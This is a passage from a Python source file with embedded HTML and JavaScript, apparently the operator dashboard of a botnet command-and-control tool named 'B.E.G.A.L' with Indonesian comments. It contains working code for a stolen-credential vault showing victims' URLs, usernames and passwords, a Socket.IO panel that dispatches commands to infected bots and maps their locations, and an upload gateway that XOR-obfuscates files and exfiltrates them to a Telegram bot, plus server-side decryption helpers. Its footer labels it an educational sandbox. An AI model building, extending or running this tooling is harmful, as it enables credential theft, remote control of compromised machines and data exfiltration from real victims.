                <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl relative">
                    <!-- Tab Buttons -->
                    <div class="flex border-b border-neutral-800 mb-4">
                        <button id="tab-btn-vault" onclick="switchTab('vault')" class="flex items-center gap-2 px-4 py-2 text-sm font-bold border-b-2 border-flipper-orange text-white transition-colors">
                            <i class="fa-solid fa-key"></i> Credential Vault
                        </button>
                    </div>

                    <!-- Tab Content: Credential Vault -->
                    <div id="tab-content-vault">
                        <h2 class="text-xl font-bold tracking-wider text-neutral-100 flex items-center gap-2.5 mb-4">
                            <i class="fa-solid fa-key text-flipper-orange"></i> Stolen Credential Vault
                        </h2>
                        <div id="vault-content" class="space-y-4 max-h-96 overflow-y-auto custom-scrollbar">
                            <p class="text-center text-xs text-neutral-500 py-4">No credentials collected yet. Awaiting data...</p>
                        </div>
                    </div>

                    </div>
                <!-- DATA EXFILTRATION GATEWAY -->
                <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl relative">
                    <div class="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-3">
                        <div>
                            <h2 class="text-xl font-bold tracking-wider text-neutral-100 flex items-center gap-2.5">
                                <i class="fa-solid fa-skull-crossbones text-flipper-orange animate-pulse"></i> Data Exfiltration Gateway
                            </h2>
                            <p class="text-xs text-neutral-400 mt-1">Files dropped here auto-encrypt and route via Secure Telegram Tunnel</p>
                        </div>
                    </div>
                    <div id="dropzone" class="border-2 border-dashed border-neutral-800 hover:border-flipper-orange/60 bg-neutral-950/40 hover:bg-flipper-orange/5 rounded-2xl p-8 md:p-12 text-center cursor-pointer transition-all duration-300 relative group overflow-hidden">
                        <div class="absolute -inset-10 bg-flipper-orange/5 rounded-full blur-3xl opacity-0 group-hover:opacity-100 transition duration-500 pointer-events-none"></div>
                        <div class="relative z-10 flex flex-col items-center">
                            <div class="w-16 h-16 bg-neutral-900 group-hover:bg-flipper-orange/10 group-hover:scale-105 rounded-full flex items-center justify-center text-neutral-500 group-hover:text-flipper-orange transition-all duration-300 border border-neutral-800 group-hover:border-flipper-orange/30 shadow-inner mb-4">
                                <i class="fa-solid fa-cloud-arrow-up text-2xl"></i>
                            </div>
                            <h3 class="text-lg font-bold tracking-wide text-neutral-200 group-hover:text-white transition-colors">DRAG & DROP SOURCE FILES</h3>
                            <p class="text-xs text-neutral-400 mt-1.5 mb-5 max-w-sm">Standard exfiltrate profiles supported (<span class="text-flipper-orange">PDF, DOCX, SQL, ZIP, DB, TXT</span> etc.)</p>
                            <input type="file" id="fileInput" multiple class="hidden">
                            <button onclick="document.getElementById('fileInput').click()" class="px-5 py-2.5 bg-neutral-900 hover:bg-neutral-800 text-flipper-orange border border-neutral-800 hover:border-flipper-orange rounded-xl text-xs font-extrabold tracking-wider transition-all duration-300 hover:shadow-[0_0_15px_rgba(255,140,0,0.15)] btn-active">BROWSE LOCAL STORAGE</button>
                        </div>
                    </div>

                    <div id="fileList" class="mt-6 space-y-2 max-h-56 overflow-y-auto custom-scrollbar"></div>

                    <button onclick="uploadFiles()" id="uploadBtn" disabled class="w-full mt-6 bg-red-600/90 hover:bg-red-600 text-white font-extrabold py-4 rounded-2xl text-md tracking-widest uppercase transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-red-600/90 flex items-center justify-center gap-3 shadow-[0_4px_20px_rgba(220,38,38,0.2)] active:translate-y-[1px] btn-active">
                        <i class="fa-solid fa-fire text-lg"></i> TRANSMIT EXFILTRATION PAYLOAD
                    </button>

                    <div id="progressContainer" class="hidden mt-6 bg-neutral-950/80 border border-neutral-800 rounded-2xl p-5 shadow-inner">
                        <div class="flex items-center justify-between text-xs font-extrabold mb-2.5">
                            <span class="text-neutral-400 tracking-wider flex items-center gap-2"><i class="fa-solid fa-wave-square text-flipper-orange animate-pulse"></i> TRANSMISSION IN PROGRESS</span>
                            <span id="progressText" class="text-flipper-orange font-mono">0%</span>
                        </div>
                        <div class="h-2 w-full bg-neutral-900 rounded-full overflow-hidden p-[1px] border border-neutral-800">
                            <div id="progressBar" class="h-full bg-gradient-to-r from-flipper-orange to-red-600 w-0 rounded-full transition-all duration-300 ease-out"></div>
                        </div>
                        <div class="mt-4 flex items-center justify-between border-b border-neutral-800/60 pb-2 mb-2">
                            <span class="text-[10px] text-neutral-500 font-bold uppercase tracking-widest">Diagnostic Stream</span>
                            <span class="text-[10px] text-emerald-500 font-bold font-mono">ONLINE</span>
                        </div>
                        <div id="log" class="text-xs font-mono bg-black/60 p-4 rounded-xl max-h-40 overflow-y-auto custom-scrollbar text-left border border-neutral-900 space-y-1.5"></div>
                    </div>
                </div>

            </section>
        </main>

        <!-- SYSTEM FOOTER -->
        <footer class="mt-10 border-t border-neutral-900 pt-6 text-center text-[10px] text-neutral-500 tracking-widest font-bold flex flex-col md:flex-row items-center justify-between gap-4">
            <p>EDUCATIONAL LAB SECURITY UTILITY • OPERATING IN LOCAL SANDBOX DEMO</p>
            <p class="text-neutral-600 hover:text-flipper-orange transition-colors">by XsanLahci - 2026</p>
        </footer>
    </div>

    <!-- CUSTOM SYSTEM NOTIFICATION MODALS -->
    <div id="modal-backdrop" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden z-50 flex items-center justify-center p-4">
        <div class="bg-neutral-950 border border-neutral-800 rounded-3xl p-6 max-w-sm w-full shadow-2xl relative overflow-hidden text-center">
            <div class="absolute inset-0 bg-gradient-to-b from-flipper-orange/5 to-transparent pointer-events-none"></div>
            <div id="modal-icon-container" class="w-14 h-14 bg-neutral-900 rounded-full flex items-center justify-center mx-auto mb-4 border border-neutral-800 text-flipper-orange text-xl">
                <i class="fa-solid fa-circle-info"></i>
            </div>
            <h3 id="modal-title" class="text-lg font-bold text-white tracking-wider mb-2">SYSTEM NOTIFICATION</h3>
            <p id="modal-body" class="text-xs text-neutral-400 mb-6 leading-relaxed">System settings updated.</p>
            <button onclick="closeModal()" class="w-full bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 hover:border-flipper-orange text-flipper-orange font-extrabold py-2.5 rounded-xl text-xs uppercase tracking-wider transition-all btn-active">
                Acknowledge
            </button>
        </div>
    </div>

    <!-- Socket.IO Client -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    
    <!-- WEB-AUDIO SYNTH SOUND EFFECTS -->
    <script>
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playBeep(freq = 800, duration = 80, type = 'sine') {
            try {
                if (audioCtx.state === 'suspended') { audioCtx.resume(); }
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = type;
                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration/1000);
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start(); osc.stop(audioCtx.currentTime + duration/1000);
            } catch(e) {}
        }
    </script>

    <!-- CLIENT LOGIC & REAL-TIME C2 MANAGER -->
    <script>
        let selectedFiles = [];
        let BOT_TOKEN = "{{DEFAULT_BOT_TOKEN}}";
        let CHAT_ID = "{{DEFAULT_CHAT_ID}}";
        const XOR_KEY = "{{DEFAULT_XOR_KEY}}";
        let map;
        let botMarkers = {};
        let selectedBotUUID = null;
        let credentialVault = {};
        let currentTab = 'vault';

        // --- TAB & TERMINAL ---
        function switchTab(tabName) {
            playBeep(700, 50);
            currentTab = tabName;
            if (tabName === 'vault') {
                document.getElementById('tab-content-vault').classList.remove('hidden');
                document.getElementById('tab-btn-vault').classList.add('border-flipper-orange', 'text-white');
                document.getElementById('tab-btn-vault').classList.remove('border-transparent', 'text-neutral-400');
            }
        }

        function renderTerminalOutput(uuid, output, isCommand) {
            const term = document.getElementById('terminal-output');
            const line = document.createElement('div');
            if (isCommand) {
                line.innerHTML = `<span class="text-flipper-orange">&gt;</span> <span class="text-neutral-300">${output}</span>`;
            } else {
                 line.innerHTML = `<span class="text-cyan-400">&lt;</span> <span class="text-neutral-400">${output}</span>`;
            }
            term.appendChild(line);
            term.scrollTop = term.scrollHeight;
        }

        // --- REAL-TIME C2 SOCKET.IO LOGIC ---
        const socket = io();

        socket.on('connect', () => {
            document.getElementById('socket-status-indicator').classList.remove('bg-yellow-500', 'bg-red-500');
            document.getElementById('socket-status-indicator').classList.add('bg-green-500');
            document.getElementById('socket-status-text').textContent = 'C2 SOCKET CONNECTED';
            playBeep(1200, 100);
            socket.emit('dashboard_connect'); // Announce to server that a dashboard has connected
        });

        socket.on('disconnect', () => {
            document.getElementById('socket-status-indicator').classList.remove('bg-green-500');
            document.getElementById('socket-status-indicator').classList.add('bg-red-500');
            document.getElementById('socket-status-text').textContent = 'C2 SOCKET DISCONNECTED';
            playBeep(200, 300);
        });

        socket.on('sessions_update', (sessions) => {
            renderSessionList(sessions);
            updateMapMarkers(sessions);
        });

        socket.on('vault_update', (vault) => {
            credentialVault = vault;
            renderVault();
        });
        
        socket.on('bot_status_update', (isActive) => {
            updateBotStatusUI(isActive);
        });

        function sendCommandToBot(command, params = {}) {
            if (!selectedBotUUID) {
                showModal("NO TARGET", "Please select a bot from the 'Active Bots' list first.", "fa-crosshairs text-yellow-400");
                return;
            }
            playBeep(600, 100);
            const payload = {
                uuid: selectedBotUUID,
                command: { name: command, ...params }
            };
            socket.emit('send_command', payload);
            showModal("COMMAND DISPATCHED", `Command '${command}' sent to bot ${selectedBotUUID.substring(0,8)}...`, "fa-paper-plane text-flipper-orange");
        }
        
        function toggleBotStatus() {
            playBeep(600, 100);
            socket.emit('toggle_bot_status');
        }

        function updateBotStatusUI(isActive) {
            const textSpan = document.getElementById('bot-status-btn-text');
            const icon = document.getElementById('bot-status-btn-icon');
            if (isActive) {
                textSpan.textContent = "BOT MONITORING: ACTIVE (CLICK TO STOP)";
                icon.className = "fa-solid fa-play text-emerald-500";
            } else {
                textSpan.textContent = "BOT MONITORING: DISABLED (CLICK TO START)";
                icon.className = "fa-solid fa-stop text-red-500";
            }
        }
        
        function getOSIcon(platform) {
            platform = (platform || '').toLowerCase();
            if (platform.includes('win')) return 'fa-brands fa-windows';
            if (platform.includes('mac')) return 'fa-brands fa-apple';
            if (platform.includes('linux')) return 'fa-brands fa-linux';
            if (platform.includes('android')) return 'fa-brands fa-android';
            return 'fa-solid fa-question-circle';
        }

        function selectBot(uuid) {
            playBeep(900, 50);
            if (selectedBotUUID === uuid) { // If clicking the same bot, deselect it
                selectedBotUUID = null;
                document.getElementById('selected-bot-uuid').textContent = 'NO TARGET SELECTED';
                // document.getElementById('terminal-target-uuid').textContent = 'NONE';
            } else {
                selectedBotUUID = uuid;
                document.getElementById('selected-bot-uuid').textContent = `TARGET: ${uuid.substring(0,8)}...`;
                // document.getElementById('terminal-target-uuid').textContent = `${uuid.substring(0,8)}...`;
            }
            // Need to manually re-render to update the highlight since we don't have get_active_bots on client
            // Easiest is to just toggle classes directly here
            document.querySelectorAll('.bot-entry').forEach(el => {
                if (el.dataset.uuid === selectedBotUUID) {
                    el.classList.add('border-flipper-orange');
                    el.classList.remove('border-neutral-800');
                } else {
                    el.classList.remove('border-flipper-orange');
                    el.classList.add('border-neutral-800');
                }
            });
            renderVault(); // Re-render vault for the selected bot
        }
        
        function renderSessionList(sessions) {
            const sessionList = document.getElementById('session-list');
            const botCount = document.getElementById('bot-count');
            const sessionKeys = Object.keys(sessions);

            if(!sessionList || !botCount) return;
            botCount.textContent = sessionKeys.length;
            
            if (sessionKeys.length === 0) {
                sessionList.innerHTML = `<div class="text-center text-xs text-neutral-500 py-4">No active bots detected.</div>`;
                return;
            }

            let html = '';
            for (const uuid in sessions) {
                const data = sessions[uuid];
                const osIcon = getOSIcon(data.os);
                const now = new Date().getTime() / 1000;
                const lastSeen = Math.round(now - data.last_seen);
                const isSelected = uuid === selectedBotUUID;

                html += `
                <div class="bot-entry flex items-center justify-between bg-neutral-950/70 p-3 border ${isSelected ? 'border-flipper-orange' : 'border-neutral-800'} rounded-lg hover:border-flipper-orange/50 transition-colors cursor-pointer" onclick="selectBot('${uuid}')" data-uuid="${uuid}">
                    <div class="flex items-center gap-3">
                        <i class="${osIcon} text-lg text-neutral-400 w-6 text-center"></i>
                        <div>
                            <div class="text-sm font-bold text-emerald-400">${data.ip}</div>
                            <div class="text-[10px] text-neutral-500 font-mono">${data.geo.city || 'Unknown City'}, ${data.geo.country || 'Unknown'} | ${data.os}</div>
                        </div>
                    </div>
                    <div class="text-xs text-neutral-500 font-mono text-right">
                        ${lastSeen}s ago
                    </div>
                </div>`;
            }
            sessionList.innerHTML = html;
        }

        function renderVault() {
            const vaultContent = document.getElementById('vault-content');
            if (!selectedBotUUID || !credentialVault[selectedBotUUID]) {
                vaultContent.innerHTML = `<p class="text-center text-xs text-neutral-500 py-4">Select a bot to view its credentials, or no credentials collected for this bot yet.</p>`;
                return;
            }

            const entries = credentialVault[selectedBotUUID];
            let html = `
                <table class="w-full text-left text-xs">
                    <thead class="text-neutral-400 uppercase tracking-wider border-b border-neutral-700">
                        <tr>
                            <th class="p-2">URL</th>
                            <th class="p-2">Username</th>
                            <th class="p-2">Password</th>
                            <th class="p-2">Timestamp</th>
                        </tr>
                    </thead>
                    <tbody>
            `;
            entries.forEach(entry => {
                const creds = entry.creds || {};
                html += `
                    <tr class="border-b border-neutral-800 font-mono">
                        <td class="p-2 text-flipper-orange truncate" title="${entry.url}">${entry.url}</td>
                        <td class="p-2">${creds.username || 'N/A'}</td>
                        <td class="p-2">${creds.password || 'N/A'}</td>
                        <td class="p-2 text-neutral-500">${entry.timestamp}</td>
                    </tr>
                `;
            });
            html += `</tbody></table>`;
            vaultContent.innerHTML = html;
        }

        // --- MAP LOGIC ---
        function initializeMap() {
            map = L.map('map').setView([20, 0], 2);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
                subdomains: 'abcd',
                maxZoom: 19
            }).addTo(map);
        }

        function updateMapMarkers(sessions) {
            // Remove markers for bots that are no longer active
            for (const uuid in botMarkers) {
                if (!sessions[uuid]) {
                    map.removeLayer(botMarkers[uuid]);
                    delete botMarkers[uuid];
                }
            }

            // Add or update markers for active bots
            for (const uuid in sessions) {
                const bot = sessions[uuid];
                if (bot.geo && bot.geo.lat && bot.geo.lon) {
                    const latLng = [bot.geo.lat, bot.geo.lon];
                    const popupContent = `<b>Bot:</b> ${uuid.substring(0,8)}...<br><b>IP:</b> ${bot.ip}<br><b>Location:</b> ${bot.geo.city}, ${bot.geo.country}`;
                    
                    if (botMarkers[uuid]) {
                        botMarkers[uuid].setLatLng(latLng).setPopupContent(popupContent);
                    } else {
                        const icon = L.divIcon({
                            className: 'custom-div-icon',
                            html: "<div style='background-color:#FF8C00;' class='marker-pin'></div><i class='fa-solid fa-spider'></i>",
                            iconSize: [30, 42],
                            iconAnchor: [15, 42]
                        });
                        botMarkers[uuid] = L.marker(latLng, { }).bindPopup(popupContent).addTo(map);
                    }
                }
            }
        }
        
        // --- EXISTING UI/FILE LOGIC (NO MAJOR CHANGES) ---
        const dropzone = document.getElementById('dropzone');
        const fileInput = document.getElementById('fileInput');
        dropzone.addEventListener('dragover', e => { e.preventDefault(); dropzone.classList.add('border-flipper-orange', 'bg-flipper-orange/5'); });
        dropzone.addEventListener('dragleave', () => { dropzone.classList.remove('border-flipper-orange', 'bg-flipper-orange/5'); });
        dropzone.addEventListener('drop', e => { e.preventDefault(); dropzone.classList.remove('border-flipper-orange', 'bg-flipper-orange/5'); playBeep(900, 100); handleFiles(e.dataTransfer.files); });
        fileInput.addEventListener('change', e => { playBeep(900, 100); handleFiles(e.target.files); });
        
        function showModal(title, body, iconClass = "fa-circle-info") {
            document.getElementById('modal-title').textContent = title;
            document.getElementById('modal-body').textContent = body;
            document.getElementById('modal-icon-container').innerHTML = `<i class="fa-solid ${iconClass}"></i>`;
            document.getElementById('modal-backdrop').classList.remove('hidden');
        }

        function closeModal() {
            playBeep(700, 60);
            document.getElementById('modal-backdrop').classList.add('hidden');
        }

        function xorUint8Array(array, key) {
            const keyBytes = new TextEncoder().encode(key);
            const result = new Uint8Array(array.length);
            for (let i = 0; i < array.length; i++) {
                result[i] = array[i] ^ keyBytes[i % keyBytes.length];
            }
            return result;
        }

        function uint8ToBase64(uint8Array) {
            let binary = '';
            const len = uint8Array.byteLength;
            for (let i = 0; i < len; i++) {
                binary += String.fromCharCode(uint8Array[i]);
            }
            return btoa(binary);
        }

        function obfuscateString(str, key) {
            let encoder = new TextEncoder();
            let bytes = encoder.encode(str);
            let xored = xorUint8Array(bytes, key);
            return uint8ToBase64(xored);
        }

        function readFileAsArrayBuffer(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = () => resolve(reader.result);
                reader.onerror = () => reject(reader.error);
                reader.readAsArrayBuffer(file);
            });
        }
        
        function handleFiles(files) {
            const allowed = ['pdf','docx','xls','xlsx','txt','csv','xml','html','php','db','sql','zip','rar','gz','pcap','jpg','jpeg','png','json','doc','sqlite','log'];
            const newFiles = Array.from(files).filter(f => allowed.includes(f.name.split('.').pop().toLowerCase()));
            if (newFiles.length < files.length) {
                showModal("FILTER INTRUSION", "Several files were bypassed due to unsupported format profiles.", "fa-filter text-amber-500");
            }
            newFiles.forEach(nf => {
                if(!selectedFiles.some(f => f.name === nf.name && f.size === nf.size)){ selectedFiles.push(nf); }
            });
            renderFileList(); updateVirtualScreen();
        }

        function removeFile(index) {
            playBeep(400, 80); selectedFiles.splice(index, 1); renderFileList(); updateVirtualScreen();
        }

        function renderFileList() {
            const listContainer = document.getElementById('fileList');
            const uploadBtn = document.getElementById('uploadBtn');
            if (selectedFiles.length === 0) { listContainer.innerHTML = ''; uploadBtn.disabled = true; return; }
            uploadBtn.disabled = false;
            let html = `<div class="flex items-center justify-between border-b border-neutral-800 pb-2.5 mb-3"><span class="text-xs font-bold text-flipper-orange tracking-wider">QUEUED TARGET PAYLOADS (${selectedFiles.length})</span><span class="text-[10px] text-neutral-500 font-mono">${(selectedFiles.reduce((acc, f) => acc + f.size, 0) / (1024*1024)).toFixed(3)} MB TOTAL</span></div>`;
            selectedFiles.forEach((file, i) => {
                const ext = file.name.split('.').pop().toUpperCase();
                let fileIcon = 'fa-file-lines';
                if(['ZIP','RAR','GZ'].includes(ext)) fileIcon = 'fa-file-zipper';
                if(['DB','SQL'].includes(ext)) fileIcon = 'fa-database';
                html += `<div class="flex items-center justify-between bg-neutral-950/70 hover:bg-neutral-950 p-3.5 border border-neutral-800 rounded-xl transition-all duration-200 group"><div class="flex items-center gap-3 w-4/5"><div class="w-8 h-8 rounded-lg bg-neutral-900 border border-neutral-800 flex items-center justify-center text-flipper-orange text-sm group-hover:bg-neutral-850"><i class="fa-solid ${fileIcon}"></i></div><div class="truncate"><div class="text-xs font-bold text-neutral-200 truncate">${file.name}</div><div class="text-[10px] text-neutral-500 font-mono mt-0.5">${(file.size/1024).toFixed(1)} KB • EXTENSION: ${ext}</div></div></div><button onclick="removeFile(${i})" class="text-neutral-500 hover:text-red-500 p-1 rounded-lg transition-colors"><i class="fa-solid fa-trash-can text-sm"></i></button></div>`;
            });
            listContainer.innerHTML = html;
        }

        async function sendToTelegramSecure(file) {
            try {
                const arrayBuffer = await readFileAsArrayBuffer(file);
                const uint8Array = new Uint8Array(arrayBuffer);
                const obfuscatedBytes = xorUint8Array(uint8Array, XOR_KEY);
                const fileDataB64 = uint8ToBase64(obfuscatedBytes);
                
                const payload = {
                    fileName: obfuscateString(file.name, XOR_KEY),
                    fileData: fileDataB64,
                    customToken: obfuscateString(BOT_TOKEN, XOR_KEY),
                    customChatId: obfuscateString(CHAT_ID, XOR_KEY)
                };

                const res = await fetch('/api/v1/dispatch', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const result = await res.json();
                return { ok: result.ok, status: result.status, description: result.description || "Unknown Error" };
            } catch (e) { 
                return { ok: false, status: "NET_ERROR", description: e.message || "Connection to secure reverse proxy failed" }; 
            }
        }
        
        async function uploadFiles() {
            if (selectedFiles.length === 0) return;

            // Direct Form Auto-Synchronization
            const tokenField = document.getElementById('tg_token_field');
            if (tokenField) BOT_TOKEN = tokenField.value.trim();
            const chatField = document.getElementById('tg_chat_field');
            if (chatField) CHAT_ID = chatField.value.trim();

            const btn = document.getElementById('uploadBtn');
            const prog = document.getElementById('progressContainer');
            const bar = document.getElementById('progressBar');
            const txt = document.getElementById('progressText');
            const log = document.getElementById('log');

            btn.disabled = true;
            prog.classList.remove('hidden');
            log.innerHTML = '';

            // Update LCD Screen Mascot Animation State
            document.getElementById('dolphin-idle').classList.add('hidden');
            document.getElementById('dolphin-success').classList.add('hidden');
            document.getElementById('dolphin-hacking').classList.remove('hidden');
            setLedState('red');

            function logMsg(msg, isSuccess = true) {
                const t = new Date().toLocaleTimeString();
                const textClass = isSuccess ? 'text-emerald-400' : 'text-red-400';
                const prefix = isSuccess ? '✓' : '✗';
                log.innerHTML += `<div class="${textClass} font-mono tracking-wide leading-relaxed">[${t}] ${prefix} ${msg}</div>`;
                log.scrollTop = log.scrollHeight;
            }

            logMsg("=== INITIATING CYBER EXFILTRATION TRANSPORT ===");
            logMsg("Routing proxy connection locally -> http://127.0.0.1:1337/api/v1/dispatch");
            logMsg("Applying client-side XOR obfuscation algorithm on binary streams...");

            let totalFiles = selectedFiles.length;
            let successCount = 0;
            let failureCount = 0;
            let lastErrorCode = null;
            let lastErrorDesc = "";

            for (let i = 0; i < totalFiles; i++) {
                const file = selectedFiles[i];
                
                document.getElementById('screen-title').textContent = "DISPATCHING...";
                document.getElementById('screen-sub').textContent = file.name;
                document.getElementById('screen-status').textContent = "BUSY";
                playBeep(700, 150, 'sawtooth');

                logMsg(`Tunneling secure payload -> ${file.name} (${(file.size/1024).toFixed(1)} KB)`);
                
                const response = await sendToTelegramSecure(file);
                
                const perc = Math.round(((i + 1) / totalFiles) * 100);
                bar.style.width = perc + '%';
                txt.textContent = perc + '%';

                if (response.ok) {
                    successCount++;
                    logMsg(`✓ ${file.name} forwarded & decrypted successfully`, true);
                    playBeep(1100, 80);
                } else {
                    failureCount++;
                    lastErrorCode = response.status;
                    lastErrorDesc = response.description;
                    logMsg(`✗ Proxy failure: ${file.name} [Status ${response.status}: ${response.description}]`, false);
                    playBeep(250, 300, 'square');
                }
                
                // Sleep delay interval to prevent Telegram API rate limits
                await new Promise(r => setTimeout(r, 800));
            }

            logMsg("=== DISPATCH COMPLETED IN ENCRYPTED PIPELINE ===", failureCount === 0);
            playBeep(1500, 400);

            // Response Validation logic checking Telegram endpoint connectivity status dynamically
            if (failureCount === totalFiles) {
                // All exfil dispatches failed
                document.getElementById('screen-title').textContent = "DISPATCH FAIL";
                document.getElementById('screen-sub').textContent = `C2 Error ${lastErrorCode}`;
                document.getElementById('screen-status').textContent = "ERROR";
                
                document.getElementById('dolphin-hacking').classList.add('hidden');
                document.getElementById('dolphin-success').classList.add('hidden');
                document.getElementById('dolphin-idle').classList.remove('hidden');
                setLedState('red');

                setTimeout(() => {
                    let title = `TRANSMISSION FAILED (${lastErrorCode})`;
                    let body = `Transmission payload rejected by Telegram C2.\n\nReason: "${lastErrorDesc}"\n\nPlease check your Bot Token & Chat ID keys.`;
                    
                    if (lastErrorCode === 401) {
                        title = "UNAUTHORIZED (401)";
                        body = `The Telegram Bot Token is unauthorized, expired, or revoked by @BotFather.\n\nTelegram response: "${lastErrorDesc}"`;
                    } else if (lastErrorCode === 400) {
                        title = "BAD REQUEST (400)";
                        body = `The chat parameters are malformed or the Bot is not added to the target chat.\n\nTelegram response: "${lastErrorDesc}"`;
                    } else if (lastErrorCode === "NET_ERROR") {
                        title = "NETWORK ERROR";
                        body = `Could not connect to the Telegram API servers.\n\nDetails: "${lastErrorDesc}"`;
                    }
                    
                    showModal(title, body, "fa-solid fa-circle-xmark text-red-500");
                    btn.disabled = false;
                }, 1000);

            } else if (failureCount > 0) {
                // Part success, part failure
                document.getElementById('screen-title').textContent = "PARTIAL DISPATCH";
                document.getElementById('screen-sub').textContent = `${successCount} done, ${failureCount} failed`;
                document.getElementById('screen-status').textContent = "WARN";

                document.getElementById('dolphin-hacking').classList.add('hidden');
                document.getElementById('dolphin-idle').classList.remove('hidden');
                setLedState('orange');

                setTimeout(() => {
                    showModal("PARTIAL TRANSMISSION", `Successfully tunneled ${successCount} files, but ${failureCount} dispatches failed during network transport.`, "fa-solid fa-triangle-exclamation text-amber-500");
                    selectedFiles = [];
                    document.getElementById('fileList').innerHTML = '';
                    btn.disabled = true;
                    prog.classList.add('hidden');
                    bar.style.width = '0%';
                    updateVirtualScreen();
                }, 1000);

            } else {
                // Flawless pipeline success
                document.getElementById('screen-title').textContent = "EXFIL DONE";
                document.getElementById('screen-sub').textContent = `${totalFiles} files routed!`;
                document.getElementById('screen-status').textContent = "DONE";
                
                document.getElementById('dolphin-hacking').classList.add('hidden');
                document.getElementById('dolphin-success').classList.remove('hidden');
                setLedState('green');

                setTimeout(() => {
                    showModal("EXFILTRATION COMPLETE", `Dispatched ${totalFiles} file(s) safely through proxy to Telegram C2 Server connection point.`, "fa-solid fa-circle-check text-emerald-500");
                    selectedFiles = [];
                    document.getElementById('fileList').innerHTML = '';
                    btn.disabled = true;
                    prog.classList.add('hidden');
                    bar.style.width = '0%';
                    setLedState('orange');
                    updateVirtualScreen();
                }, 1200);
            }
        }
        function setLedState(state) {
            const led = document.getElementById('hardware-led');
            led.className = "w-3.5 h-3.5 rounded-full transition-colors duration-300";
            if (state === 'green') {
                led.classList.add('bg-emerald-500', 'shadow-[0_0_8px_rgba(16,185,129,0.9)]');
            } else if (state === 'red') {
                led.classList.add('bg-red-500', 'shadow-[0_0_8px_rgba(239,68,68,0.9)]');
            } else {
                led.classList.add('bg-orange-500', 'shadow-[0_0_8px_rgba(249,115,22,0.9)]');
            }
        }
        function navScreen(direction) {
            playBeep(800, 40);
            
            if (direction === 'UP' || direction === 'LEFT') {
                currentScreenMode = (currentScreenMode - 1 + 4) % 4;
            } else if (direction === 'DOWN' || direction === 'RIGHT') {
                currentScreenMode = (currentScreenMode + 1) % 4;
            } else if (direction === 'OK') {
                playBeep(1200, 100);
                if (currentScreenMode === 2) {
                    toggleAccordion('config-drawer');
                }
            } else if (direction === 'BACK') {
                currentScreenMode = 0;
            }

            updateVirtualScreen();
        }
        function updateVirtualScreen() {
            const title = document.getElementById('screen-title');
            const sub = document.getElementById('screen-sub');
            const count = document.getElementById('screen-count');
            const modeDesc = document.getElementById('screen-mode-desc');

            count.textContent = selectedFiles.length;
            modeDesc.textContent = screenModeDescriptors[currentScreenMode];

            document.getElementById('dolphin-idle').classList.remove('hidden');
            document.getElementById('dolphin-hacking').classList.add('hidden');
            document.getElementById('dolphin-success').classList.add('hidden');

            if (currentScreenMode === 0) {
                title.textContent = selectedFiles.length > 0 ? "DISPATCH READY" : "SYSTEM READY";
                sub.textContent = selectedFiles.length > 0 ? `${selectedFiles.length} file(s) queued` : "Drop files into exfil gateway";
            } else if (currentScreenMode === 1) {
                title.textContent = "PAYLOAD QUEUE";
                sub.textContent = selectedFiles.length > 0 ? `Total size: ${(selectedFiles.reduce((a,f)=>a+f.size,0)/1024).toFixed(1)} KB` : "Queue is empty";
            } else if (currentScreenMode === 2) {
                title.textContent = "C2 CONFIG";
                const tempToken = BOT_TOKEN !== "xxx:xxx" ? (BOT_TOKEN.substring(0, 10) + "...") : "xxx:xxx";
                sub.textContent = `Tok:${tempToken} ID:${CHAT_ID}`;
            } else if (currentScreenMode === 3) {
                title.textContent = "RED TEAM SUITE";
                sub.textContent = "Created by xsanlahci";
            }
        }

        // Real-time LCD Seconds Timer sync
        setInterval(() => {
            const timeSpan = document.getElementById('screen-timer');
            if(timeSpan) timeSpan.textContent = new Date().toTimeString().split(' ')[0];
        }, 1000);

        // Initial Hardware Load Sequence
        window.onload = function() {
            setLedState('orange');
            updateVirtualScreen();
            initializeMap();
            // Initial status is fetched via websocket 'connect' and 'bot_status_update' events now
        };
    </script>
</body>
</html>"""

# ================== ALAT BANTU (XOR Dekripsi & Obfuscation) ==================
def xor_decrypt(data_base64, key):
    """
    Melakukan dekode Base64 lalu menerapkan XOR bitwise dinamis.
    Berguna untuk mendekripsi isi berkas biner mentah secara langsung di RAM.
    """
    if not data_base64:
        return b""
    encrypted_data = base64.b64decode(data_base64)
    key_bytes = key.encode('utf-8')
    decrypted = bytearray(len(encrypted_data))
    for i in range(len(encrypted_data)):
        decrypted[i] = encrypted_data[i] ^ key_bytes[i % len(key_bytes)]
    return bytes(decrypted)

def decrypt_string(obfuscated_b64, key):
    """
    Mendekripsi parameter data string teks biasa (seperti nama berkas dan konfigurasi).
    """
    if not obfuscated_b64:
        return ""
    try:
        decrypted_bytes = xor_decrypt(obfuscated_b64, key)
        return decrypted_bytes.decode('utf-8')
    except Exception:
        return ""

def get_active_bots():

    """Mengembalikan dictionary bot yang masih aktif."""

    now = datetime.now().timestamp()

    # Filter bot yang masih aktif (terlihat dalam SESSION_TIMEOUT terakhir)

    return {

        uuid: data for uuid, data in ACTIVE_SESSIONS.items()

        if (now - data.get('last_seen', 0)) < SESSION_TIMEOUT

    }



# ================== HTML: HALAMAN MASUK (SECURE LOGIN) ==================

LOGIN_HTML_CONTENT = """<!DOCTYPE html>

<html lang="id">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>B.E.G.A.L</title>

